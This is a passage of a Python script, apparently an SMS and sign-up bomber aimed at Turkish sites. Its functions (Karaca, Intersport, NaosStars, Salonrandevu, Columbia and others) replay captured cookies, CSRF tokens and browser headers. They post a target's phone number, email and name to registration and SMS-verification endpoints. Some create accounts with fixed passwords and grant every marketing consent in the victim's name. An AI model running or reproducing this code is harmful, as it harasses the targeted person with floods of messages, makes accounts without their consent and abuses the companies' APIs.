                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMxNjYwNjUiLCJhcCI6IjUzODUyNzkzMCIsImlkIjoiZjZmMzZiMWJhOTllYzMxOCIsInRyIjoiNzczM2VmMjI2MTY4NGNhMzJhZmMxZWNkNDRkOWMxYTkiLCJ0aSI6MTcwOTAzODU0MjU4MH19',
                'origin': 'https://www.karaca.com',
                'referer': 'https://www.karaca.com/account/register',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-7733ef2261684ca32afc1ecd44d9c1a9-f6f36b1ba99ec318-01',
                'tracestate': '3166065@nr=0-1-3166065-538527930-f6f36b1ba99ec318----1709038542580',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-csrf-token': '4c0e843f0a61a3504dc6e6b3db6694ec',
                'x-kl-kis-ajax-request': 'Ajax_Request',
                'x-newrelic-id': 'VwcBV1ZVDRAEV1JWBwIAUlQ=',
                'x-requested-with': 'XMLHttpRequest',
                }

                json_data = {
                'telephone': f'{phone}',
                'logged': True,
                }

                response = requests.post(
                'https://www.karaca.com/index.php?route=api/user/sendUserVerification',
                cookies=cookies,
                headers=headers,
                json=json_data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Karaca ====> https://www.karaca.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX +  "[-]" + "Karaca Arıza"+ Style.RESET_ALL) 
    def intersport():
        try:
                cookies = {
                'sessionid': 'ppzjywmi5zzp6fpcrwvfwflhyllli377',
                'scarab.visitor': '%2212C4E1F6DD267D5F%22',
                'OptanonAlertBoxClosed': '2024-02-29T14:11:53.619Z',
                'OptanonConsent': 'isGpcEnabled=0&datestamp=Thu+Feb+29+2024+17%3A11%3A53+GMT%2B0300+(GMT%2B03%3A00)&version=202401.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false',
                '_gcl_au': '1.1.1232743314.1709215914',
                '_ga': 'GA1.3.281707223.1709215912',
                '_gid': 'GA1.3.1316912106.1709215914',
                '_dc_gtm_UA-161958424-1': '1',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%222B8VeuQzjnH5Bt7c5wIL%22%7D',
                '_fbp': 'fb.2.1709215913846.1617716877',
                '_tt_enable_cookie': '1',
                '_ttp': 'JvV0uzygVmf8-XWUcVB76bBqETe',
                '_clck': '1yxpu17%7C2%7Cfjo%7C0%7C1520',
                'cto_bundle': 'Bnn9y19abFVMS1llRmRCVUthWE4xJTJCc0ltbEw1Y1Q2TDVBTW01QlNUUzZMJTJCQWglMkIybWJUdXNYbENjJTJCJTJGS0RaVSUyRkk0bTJ3eFBUblpZWlh2UWxMSXRwSFpBeTRiZ3BpMGZwSzRoTDd2bFRYemJyNmVmWjZnTGlPOFphU3FjaWd6ZUolMkZYcHd0JTJCTyUyQmprUzF6WCUyRk9za1JYU0xRcFBpb1pJQjBpZ0xKbkg2S2N6ejlHbzl2enc5eWZETjM5Smk2NnlMU1lQWnZkVUZxakVlbHR4dW5TS3NHWHNhcW00MVElM0QlM0Q',
                '_clsk': '1ieic1n%7C1709215914954%7C1%7C1%7Cw.clarity.ms%2Fcollect',
                '_ga_KKS3H7YT5W': 'GS1.1.1709215912.1.1.1709215933.40.0.346834227',
                }

                headers = {
                'authority': 'www.intersport.com.tr',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                # 'cookie': 'sessionid=ppzjywmi5zzp6fpcrwvfwflhyllli377; scarab.visitor=%2212C4E1F6DD267D5F%22; OptanonAlertBoxClosed=2024-02-29T14:11:53.619Z; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Feb+29+2024+17%3A11%3A53+GMT%2B0300+(GMT%2B03%3A00)&version=202401.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false; _gcl_au=1.1.1232743314.1709215914; _ga=GA1.3.281707223.1709215912; _gid=GA1.3.1316912106.1709215914; _dc_gtm_UA-161958424-1=1; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%222B8VeuQzjnH5Bt7c5wIL%22%7D; _fbp=fb.2.1709215913846.1617716877; _tt_enable_cookie=1; _ttp=JvV0uzygVmf8-XWUcVB76bBqETe; _clck=1yxpu17%7C2%7Cfjo%7C0%7C1520; cto_bundle=Bnn9y19abFVMS1llRmRCVUthWE4xJTJCc0ltbEw1Y1Q2TDVBTW01QlNUUzZMJTJCQWglMkIybWJUdXNYbENjJTJCJTJGS0RaVSUyRkk0bTJ3eFBUblpZWlh2UWxMSXRwSFpBeTRiZ3BpMGZwSzRoTDd2bFRYemJyNmVmWjZnTGlPOFphU3FjaWd6ZUolMkZYcHd0JTJCTyUyQmprUzF6WCUyRk9za1JYU0xRcFBpb1pJQjBpZ0xKbkg2S2N6ejlHbzl2enc5eWZETjM5Smk2NnlMU1lQWnZkVUZxakVlbHR4dW5TS3NHWHNhcW00MVElM0QlM0Q; _clsk=1ieic1n%7C1709215914954%7C1%7C1%7Cw.clarity.ms%2Fcollect; _ga_KKS3H7YT5W=GS1.1.1709215912.1.1.1709215933.40.0.346834227',
                'origin': 'https://www.intersport.com.tr',
                'referer': 'https://www.intersport.com.tr/users/register/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-csrftoken': 'rsFErGU87zAR89vClK3MhHGMXml13qmkyUjCcP8SZFo4bjuoJFgXQqnjU4Zd403j',
                }
                json_data = {
                'email': f'{mail}',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'date_of_birth': '1999-02-03',
                'password': 'Hu3Vuxp.Y*VHjB',
                'phone': f'0{phone}',
                'sms_allowed': True,
                'email_allowed': True,
                'call_allowed': True,
                'gender': 'female',
                'confirm': True,
                'attributes': '{"confirm":true}',
                }
                response = requests.post('https://www.intersport.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "İntersport ====> https://www.intersport.com.tr"+ Style.RESET_ALL)
        except:
                print( Fore.LIGHTRED_EX + "[-]" + "İntersport Arıza" + Style.RESET_ALL)
    def naosstar(): #1
        try :
            cookies = {
            '_fbp': 'fb.1.1730774182039.439120454238120621',
            '_tt_enable_cookie': '1',
            '_ttp': 'hTXtZr0I_pGh5ETCV6bATZR7j5w',
            '_hjSession_3176877': 'eyJpZCI6IjRmZWIxNmUyLTBlYTUtNDA0MS1iZGFjLTA0ZmI1MDA2MDYzZiIsImMiOjE3MzA3NzQxODI2NjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
            'OfferMiner_ID': 'NCTIUTPJOIIMEFOK20241105053623',
            '_hjSessionUser_3176877': 'eyJpZCI6ImMwOTg5ZTI2LTA0NWItNTQ1Yi1iMDE2LTBhZjc2Y2E1MjM5YSIsImNyZWF0ZWQiOjE3MzA3NzQxODI2NjEsImV4aXN0aW5nIjp0cnVlfQ==',
            'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2239%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222024-11-05%2006%3A06%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22NCTIUTPJOIIMEFOK20241105053623%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-12-05%2005%3A36%3A24%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fnaosstars.com%252Fuser%252Flogin%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A24%22%7D%5D%7D',
            'naos_session': 'eyJpdiI6IkJJR3J6RVo4SFNVOG4ybXRXY25jZkE9PSIsInZhbHVlIjoicmptd2NoV1JRT2M0Wm1lUkpiWjZkU0tsenRtektzZ2JFaTk0anBQcFFCZXVtcklPV0dORUU0VFZ5TUNSaDRXY2VVN3pFdHVzdHQ4aEw2SzNSTVBEeVptcGx6NDBNMVFGRFNuaTRwM1VHN0VxbEV3MUFuRDVSajNvZzJxck8zaDIiLCJtYWMiOiJiODlkNDhjNGVhNDk3NDA4OTU3OWJhZTk5MGFhZGY3ODA1ZDg1Njg1MjZmYmQ2MThlY2RlZTYzMDM1YTI4MWY4IiwidGFnIjoiIn0%3D',
            }
            headers = {
                'accept': 'application/json',
                'accept-language': 'tr-TR,tr;q=0.9',
                'content-type': 'application/json',
                # 'cookie': '_fbp=fb.1.1730774182039.439120454238120621; _tt_enable_cookie=1; _ttp=hTXtZr0I_pGh5ETCV6bATZR7j5w; _hjSession_3176877=eyJpZCI6IjRmZWIxNmUyLTBlYTUtNDA0MS1iZGFjLTA0ZmI1MDA2MDYzZiIsImMiOjE3MzA3NzQxODI2NjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; OfferMiner_ID=NCTIUTPJOIIMEFOK20241105053623; _hjSessionUser_3176877=eyJpZCI6ImMwOTg5ZTI2LTA0NWItNTQ1Yi1iMDE2LTBhZjc2Y2E1MjM5YSIsImNyZWF0ZWQiOjE3MzA3NzQxODI2NjEsImV4aXN0aW5nIjp0cnVlfQ==; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2239%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222024-11-05%2006%3A06%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22NCTIUTPJOIIMEFOK20241105053623%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-12-05%2005%3A36%3A24%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fnaosstars.com%252Fuser%252Flogin%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A24%22%7D%5D%7D; naos_session=eyJpdiI6IkJJR3J6RVo4SFNVOG4ybXRXY25jZkE9PSIsInZhbHVlIjoicmptd2NoV1JRT2M0Wm1lUkpiWjZkU0tsenRtektzZ2JFaTk0anBQcFFCZXVtcklPV0dORUU0VFZ5TUNSaDRXY2VVN3pFdHVzdHQ4aEw2SzNSTVBEeVptcGx6NDBNMVFGRFNuaTRwM1VHN0VxbEV3MUFuRDVSajNvZzJxck8zaDIiLCJtYWMiOiJiODlkNDhjNGVhNDk3NDA4OTU3OWJhZTk5MGFhZGY3ODA1ZDg1Njg1MjZmYmQ2MThlY2RlZTYzMDM1YTI4MWY4IiwidGFnIjoiIn0%3D',
                'language': 'null',
                'origin': 'https://naosstars.com',
                'priority': 'u=1, i',
                'referer': 'https://naosstars.com/user/register',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'x-csrf-token': 'Yc8IdEux3MnAFFg9LWki4zXC69bIuJjSwJCCy90v',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'type': 'register',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'email': f'{mail}',
                'telephone': f'(+90){t1}{t2}{t3}-{t4}{t5}{t6}-{t7}{t8}-{t9}{t10}',
                'new_password': 'Port2_Akal',
                'invitation_code': '',
                'permission_newsletter': '1',
                'kvkk': '1',
                'user_check': '1',
            }

            response = requests.post(
                'https://naosstars.com/api/smsSend/518f829d-5835-4651-a654-da9975916ad8',
                cookies=cookies,
                headers=headers,
                json=json_data,
            )
            print(Fore.LIGHTGREEN_EX + "[+]" + "NaosStar ====> https://naosstars.com"+ Style.RESET_ALL)
        except:
            pass
    def salonrandevu():
        try:
                headers = {
                'authority': 'api.salonrandevu.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://salonrandevu.com',
                'referer': 'https://salonrandevu.com/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                }       
                                                    
                json_data = {
                'phone': phone,
                'mail': mail,
                'dialCode': '+90',
                }

                response = requests.post('https://api.salonrandevu.com/api/v1/register', headers=headers, json=json_data) 
                print(Fore.LIGHTGREEN_EX + "[+]" + "Salonrandevu ====> https://api.salonrandevu.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Salonrandevu Arıza"+ Fore.LIGHTWHITE_EX)
    def Columbia():
        try:
                cookies = {
                '_ga': 'GA1.3.1112719085.1709062944',
                '_gid': 'GA1.3.991523276.1709062944',
                '_gac_UA-48957753-1': '1.1709062944.CjwKCAiArfauBhApEiwAeoB7qClid6nhl1pZh-Bigxk0fpOgbIx6z5oStAEpimAmxe6gDRJH1dpWSBoCfQ4QAvD_BwE',
                '__gtm_campaign_url': 'https%3A%2F%2Fwww.columbia.com.tr%2F%3Fgad_source%3D1%26gclid%3DCjwKCAiArfauBhApEiwAeoB7qClid6nhl1pZh-Bigxk0fpOgbIx6z5oStAEpimAmxe6gDRJH1dpWSBoCfQ4QAvD_BwE',
                '__gtm_referrer': 'https%3A%2F%2Fwww.google.com%2F',
                'initialTrafficSource': 'utmcsr=google|utmcmd=cpc|utmccn=(not set)',
                '__utmzzses': '1',
                'ccpa': '021c3bf3-2873-8c31-5a8f-68cce78beafb',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22t4PmH0RmH0VccBmukZ0W%22%7D',
                '_ym_uid': '1709062946416906160',
                '_ym_d': '1709062946',
                '_fbp': 'fb.2.1709062945880.308324590',
                '_hjSession_685712': 'eyJpZCI6IjhlMjRiNjQ2LWVhOWQtNDdjYS1iNTI2LTQ0MWNlMGNiZTUwNyIsImMiOjE3MDkwNjI5NDYwNDgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
                '_ym_isad': '2',
                '_sgf_user_id': '-6139467384103763967',
                '_sgf_session_id': '-6139467384103763968',
                '_sgf_exp': '',
                '_gat': '1',
                '_hjSessionUser_685712': 'eyJpZCI6IjQxMjJjOGZhLWFkMzctNWE2Ni05ZTM1LWIwNWNhNDFkYWU2OCIsImNyZWF0ZWQiOjE3MDkwNjI5NDYwNDcsImV4aXN0aW5nIjp0cnVlfQ==',
                'cto_bundle': '7Uzv8F9jTWtvSkJTSTVkUWJRQUtiZUtPRXN5ZU1MZUdwTkh3bkw3RkNRQU1QT21ETEdTSldPaHQ5ejJDaWJoNVA4N3JkbmZzRFFLcHlnVG9ZQlZpVjJxYk5GS0J4bVRnZXZlM3h4RGd3VlQ0UmhiOFBNTjBtOUxaMVoxWlRBUHNvRWNvMUpQaFNpMlp6OTdOMFl2eiUyQmkyc2oyWVk0dnlWWnAxZ1hMSUwyaTJ6VDVBOVhXeVR3YmYxSUZpNWlqYlpSSzJLMTBWdFYwR2FrMHgwTyUyQmZXSHVWcUhwQSUzRCUzRA',
                'ccpu': 'gkL0y5I2PS1B.1709063361',
                'cookie_consent_level': '%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D',
                'cookie_consent_user_accepted': 'true',
                '_gcl_au': '1.1.1974680465.1709063361',
                '_ga_S8CE2Z5F5J': 'GS1.1.1709063353.1.0.1709063361.60.0.0',
                }

                headers = {
                'authority': 'www.columbia.com.tr',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': '_ga=GA1.3.1112719085.1709062944; _gid=GA1.3.991523276.1709062944; _gac_UA-48957753-1=1.1709062944.CjwKCAiArfauBhApEiwAeoB7qClid6nhl1pZh-Bigxk0fpOgbIx6z5oStAEpimAmxe6gDRJH1dpWSBoCfQ4QAvD_BwE; __gtm_campaign_url=https%3A%2F%2Fwww.columbia.com.tr%2F%3Fgad_source%3D1%26gclid%3DCjwKCAiArfauBhApEiwAeoB7qClid6nhl1pZh-Bigxk0fpOgbIx6z5oStAEpimAmxe6gDRJH1dpWSBoCfQ4QAvD_BwE; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; initialTrafficSource=utmcsr=google|utmcmd=cpc|utmccn=(not set); __utmzzses=1; ccpa=021c3bf3-2873-8c31-5a8f-68cce78beafb; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22t4PmH0RmH0VccBmukZ0W%22%7D; _ym_uid=1709062946416906160; _ym_d=1709062946; _fbp=fb.2.1709062945880.308324590; _hjSession_685712=eyJpZCI6IjhlMjRiNjQ2LWVhOWQtNDdjYS1iNTI2LTQ0MWNlMGNiZTUwNyIsImMiOjE3MDkwNjI5NDYwNDgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _ym_isad=2; _sgf_user_id=-6139467384103763967; _sgf_session_id=-6139467384103763968; _sgf_exp=; _gat=1; _hjSessionUser_685712=eyJpZCI6IjQxMjJjOGZhLWFkMzctNWE2Ni05ZTM1LWIwNWNhNDFkYWU2OCIsImNyZWF0ZWQiOjE3MDkwNjI5NDYwNDcsImV4aXN0aW5nIjp0cnVlfQ==; cto_bundle=7Uzv8F9jTWtvSkJTSTVkUWJRQUtiZUtPRXN5ZU1MZUdwTkh3bkw3RkNRQU1QT21ETEdTSldPaHQ5ejJDaWJoNVA4N3JkbmZzRFFLcHlnVG9ZQlZpVjJxYk5GS0J4bVRnZXZlM3h4RGd3VlQ0UmhiOFBNTjBtOUxaMVoxWlRBUHNvRWNvMUpQaFNpMlp6OTdOMFl2eiUyQmkyc2oyWVk0dnlWWnAxZ1hMSUwyaTJ6VDVBOVhXeVR3YmYxSUZpNWlqYlpSSzJLMTBWdFYwR2FrMHgwTyUyQmZXSHVWcUhwQSUzRCUzRA; ccpu=gkL0y5I2PS1B.1709063361; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; cookie_consent_user_accepted=true; _gcl_au=1.1.1974680465.1709063361; _ga_S8CE2Z5F5J=GS1.1.1709063353.1.0.1709063361.60.0.0',
                'language-culture': 'tr-TR',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4NDEwNTkiLCJhcCI6IjMxMjkxMjQxOSIsImlkIjoiODdjOTlkY2ZjMzU3NTI2NiIsInRyIjoiNDIwZjc2ZDE0ZGJmYzFmNWM5YmUyMmU2MzVlNGU4MDAiLCJ0aSI6MTcwOTA2MzM3NDM4OX19',
                'origin': 'https://www.columbia.com.tr',
                'referer': 'https://www.columbia.com.tr/auth?action=register',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-420f76d14dbfc1f5c9be22e635e4e800-87c99dcfc3575266-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                }

                json_data = {
                'firstName': f'{ad}',
                'lastName': f'{soyad}',
                'email': f'{mail}',
                'phone': f'0{phone}',
                'smsPermission': True,
                'emailPermission': True,
                'sharePermission': True,
                'kvkkPermission': True,
                'callPermission': True,
                'isConsentTextConfirmed': True,
                }
                response = requests.post(
                'https://www.columbia.com.tr/api/customer/customerpolicy/setpermission',
                cookies=cookies,
                headers=headers,
                json=json_data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Columbia ====> https://www.columbia.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTWHITE_EX + "[-]" + "Columbia Arıza"+ Style.RESET_ALL)
    def tiklagelsin():
        try:
            headers = {     
            'authority': 'www.vakko.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            # 'cookie': 'sessionid=6wxg8ks80wc7e7us24cfjxdtfzqjdlwc; _gid=GA1.2.1721728972.1708721773; _gac_UA-16233710-1=1.1708721773.Cj0KCQiAoeGuBhCBARIsAGfKY7z_T3bD0iPpyysFLAXpjy-Eqf53rLmcdTEH1J8_WOemZJzgSzMwNOwaApbQEALw_wcB; OfferMiner_ID=YKPCYRUERYXIPQVH20240223235613; OptanonAlertBoxClosed=2024-02-23T20:56:21.444Z; _gcl_au=1.1.1172612798.1708721781; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22ShCaSfj4f3zwl3Z02Igp%22%7D; _p2s_uvi=d1abff01.1949391980637285.1708721782033; _hjSession_883027=eyJpZCI6ImQyNzYyNWU4LTgzZDItNGYyOS1iOTEwLWJhNWU4MDdhOThhYyIsImMiOjE3MDg3MjE3ODIwNjgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1708721782087.577100634; _ga_000D6QJ06S=GS1.1.1708721772.1.1.1708721783.49.0.0; _ga=GA1.1.1013944145.1708721772; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Feb+23+2024+23%3A56%3A23+GMT%2B0300+(GMT%2B03%3A00)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=&consentId=b61fea45-f90a-463b-8eac-b93b12c5d9e0&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=%3B; _hjSessionUser_883027=eyJpZCI6IjY2NDcwODYyLTE3MTAtNWVhYi1hMWIwLTliZTkzZDc3NjIyYyIsImNyZWF0ZWQiOjE3MDg3MjE3ODIwNjcsImV4aXN0aW5nIjp0cnVlfQ==; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2211%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22YKPCYRUERYXIPQVH20240223235613%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-03-24%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.vakko.com%252Fusers%252Flogin%252F%22%2C%22E%22%3A%222026-02-12%2023%3A56%